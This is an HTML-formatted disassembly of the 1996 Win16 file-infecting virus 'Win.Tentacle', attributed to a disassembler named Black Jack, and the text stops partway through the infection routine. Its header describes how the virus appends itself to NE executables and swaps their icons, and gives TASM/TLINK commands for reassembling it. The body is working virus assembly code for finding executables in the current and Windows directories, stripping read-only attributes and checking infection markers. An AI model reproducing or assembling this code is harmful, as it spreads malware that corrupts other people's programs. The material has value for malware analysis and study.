<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>tentacle.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Name            : Win.Tentacle</span><span class="sc0">
</span><span class="sc1">; Author          : ?</span><span class="sc0">
</span><span class="sc1">; Type            : direct acting Win16 NE appender</span><span class="sc0">
</span><span class="sc1">; Size            : 1948 bytes virus body (because of relocation stuff</span><span class="sc0">
</span><span class="sc1">;                   infected files increase for at least 1958 bytes)</span><span class="sc0">
</span><span class="sc1">; Origin          : ?</span><span class="sc0">
</span><span class="sc1">; When            : 1996</span><span class="sc0">
</span><span class="sc1">; Status          : was in the wild (distributed in cracking newsgroups in 1996)</span><span class="sc0">
</span><span class="sc1">; Disassembled by : Black Jack</span><span class="sc0">
</span><span class="sc1">; Contact me      : Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Description:</span><span class="sc0">
</span><span class="sc1">; When an infected file is run, the virus gets control. It then searches for a</span><span class="sc0">
</span><span class="sc1">; .EXE file in the current directory, and another one in the C:\WINDOWS</span><span class="sc0">
</span><span class="sc1">; directory and tries to infect it. While infection the virus creates a</span><span class="sc0">
</span><span class="sc1">; temporary file C:\TENTACLE.$$$ and rebuilds there an infected image of the</span><span class="sc0">
</span><span class="sc1">; victim file. When the infection process is finished this file is copied back</span><span class="sc0">
</span><span class="sc1">; over the victim file and then deleted.</span><span class="sc0">
</span><span class="sc1">; The infection technique is adding another segment with the virus code at the</span><span class="sc0">
</span><span class="sc1">; end of the file. To add its own entry to the segment table, it checks if there</span><span class="sc0">
</span><span class="sc1">; is enough unused room between the end of the NE header tables and the start of</span><span class="sc0">
</span><span class="sc1">; the first segment and aborts infection if not. Then it shifts back all tables</span><span class="sc0">
</span><span class="sc1">; after the segment table (therefore overwriting the unused fill bytes) and</span><span class="sc0">
</span><span class="sc1">; fixes their offsets in the NE header, so that it can write its own segment</span><span class="sc0">
</span><span class="sc1">; descriptor at the end of the segment table. Finally the entry point in the NE</span><span class="sc0">
</span><span class="sc1">; header is set to the virus body, and the old one is stored in a relocation</span><span class="sc0">
</span><span class="sc1">; item at the end of the virus body that is used to restore control to the host.</span><span class="sc0">
</span><span class="sc1">; Whenever the virus infects a file between 00:00am and 00:15am the virus</span><span class="sc0">
</span><span class="sc1">; activates its payload routine: it searches the resource table of the victim</span><span class="sc0">
</span><span class="sc1">; file for the icon resource and replaces it with its own icon, a picture of the</span><span class="sc0">
</span><span class="sc1">; violet tentacle from the classical computer game "the day of the tentacle".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Reassembly tested with Tasm 3.1 and TLink 3.0 .</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         TASM /M tentacle</span><span class="sc0">
</span><span class="sc1">;         TLINK tentacle</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; first generation sample is a DOS EXE file and infects all suitable EXE files</span><span class="sc0">
</span><span class="sc1">; in the current directory only.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">segm_offset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">segm_phys_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">segm_attribs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0001110101010000b</span><span class="sc0">
</span><span class="sc5">segm_virt_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">tmp_filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\TENTACLE.$$$"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">windir_filespec</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">"C:\WINDOWS\"
</span><span class="sc5">filespec</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">relocation_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000FFFFh</span><span class="sc0">       </span><span class="sc1">; pointers that will become relocated</span><span class="sc0">
                    </span><span class="sc1">; must be initialised by 0:FFFF</span><span class="sc0">

</span><span class="sc1">; This is the real start of the relocation data:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; one relocation item</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; 32bit far pointer</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; internal reference</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">org_entry</span><span class="sc0">  </span><span class="sc1">; offset of pointer to relocate</span><span class="sc0">

</span><span class="sc5">size_of_relocation_stuff</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">relocation_stuff</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">; The relocation destination (host entry CS:IP) will be written afterwards</span><span class="sc0">


</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; save all registers</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack_frame</span><span class="sc0">     </span><span class="sc1">; reserve room on stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; setup stack frame</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">; set DTA to DS:DX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.dta</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Load effective addr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc0">      </span><span class="sc1">; DX=ptr to "*.EXE"</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; get one file in current directory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_directory</span><span class="sc0">        </span><span class="sc1">; search &amp; infect!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir_filespec</span><span class="sc0"> </span><span class="sc1">; DX=ptr to "C:\WINDOWS\*.EXE"</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; get three files in windows directory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_directory</span><span class="sc0">        </span><span class="sc1">; search &amp; infect!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">; set DTA to DS:DX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                  </span><span class="sc1">; DX=80h (standart DTA offset)</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; DS=ES=PSP (or equivalent) segment</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack_frame</span><span class="sc0">     </span><span class="sc1">; free room on stack</span><span class="sc0">

    </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">org_entry</span><span class="sc0">            </span><span class="sc1">; jump to host entrypoint</span><span class="sc0">



</span><span class="sc1">; ----- INFECT A DIRECTORY --------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; DX=offset of file specification ("*.EXE" or "C:\WINDOWS\*.EXE")</span><span class="sc0">
</span><span class="sc1">; BX=files to infect</span><span class="sc0">

</span><span class="sc5">infect_directory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*      cmp     dx,offste windir_filespec  ; search in windows directory?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_windows_dir</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; save ES</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; SI=ptr to "C:\WINDOWS\"</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">bp.full_filename</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DI=ptr to buffer on stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">; save offset to full filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; ES=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">                   </span><span class="sc1">; length of "C:\WINDOWS\"</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; clear direction flag</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; move path ("C:\WINDOWS\")</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; restore ES</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">start_filesearch</span><span class="sc0">

</span><span class="sc5">not_windows_dir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bp.dta</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AX=offset of found filename in DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; save offset to full filename</span><span class="sc0">
</span><span class="sc5">start_filesearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc1">; save segm. to full filename</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                  </span><span class="sc1">; find first file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; normal and hidden files</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">do_file_search</span><span class="sc0">

</span><span class="sc5">do_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*      cmp     dx,offste windir_filespec  ; filesearch in windows directory?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_windows_dir_2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; save ES and DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">                   </span><span class="sc1">; ES=DS=SS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">bp.dta</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; SI=offset of found filename</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">bp.full_filename</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; clear direction flag</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy filename</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">not_windows_dir_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.dta</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; read only attribute set?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">not_readonly</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; save DX</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">                </span><span class="sc1">; AX=4301h (set file attributes)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1301h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; set high byte of attributes to zero</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">bp.dta</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; CL=low byte of attributes</span><span class="sc0">
</span><span class="sc1">;*      and     cx,0FFFEh               ; delete read-only attribute</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">           </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; DS:DX=address of filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; restore DX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">findnext</span><span class="sc0">                </span><span class="sc1">; error? if so, search on</span><span class="sc0">

</span><span class="sc5">not_readonly</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">             </span><span class="sc1">; infect the file!</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">findnext</span><span class="sc0">                </span><span class="sc1">; on error while infecting search on!</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; decrement infection counter</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">done_directory</span><span class="sc0">          </span><span class="sc1">; enough files infected?</span><span class="sc0">
</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                  </span><span class="sc1">; find next file</span><span class="sc0">

</span><span class="sc5">do_file_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; do the file search</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">do_file</span><span class="sc0">                 </span><span class="sc1">; if no error happened, process file</span><span class="sc0">

</span><span class="sc5">done_directory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ----- INFECT A FILE -------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">; save all registers</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                </span><span class="sc1">; open file read-only</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.filename_ptr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; DS:DX=pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">open_file_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_infect</span><span class="sc0">
</span><span class="sc5">open_file_ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; handle to BX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.source_handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; save handle</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_file_date_time_size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read DOS header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                   </span><span class="sc1">; DOS header size</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load effective addr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; restore DS</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_dos_header_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">read_dos_header_ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX=exe marker</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; anti-heuristic</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"ZM"</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; EXE file?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; close if not</span><span class="sc0">
</span><span class="sc5">exe_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFEh  ; maxmem item in</span><span class="sc0">
                                        </span><span class="sc1">; DOS header is infection marker</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">     </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_infected_yet</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; already infected</span><span class="sc0">
</span><span class="sc5">not_infected_yet</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*      cmp     word ptr [bp.rw_buffer+0Ch],0FFFFh  ; has the maxmem item</span><span class="sc0">
                                        </span><span class="sc1">; the standart value?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; fixup - byte match</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">standart_maxmem</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; if not, then don't infect the file</span><span class="sc0">
</span><span class="sc5">standart_maxmem</span><span class="sc4">:</span><span class="sc0">

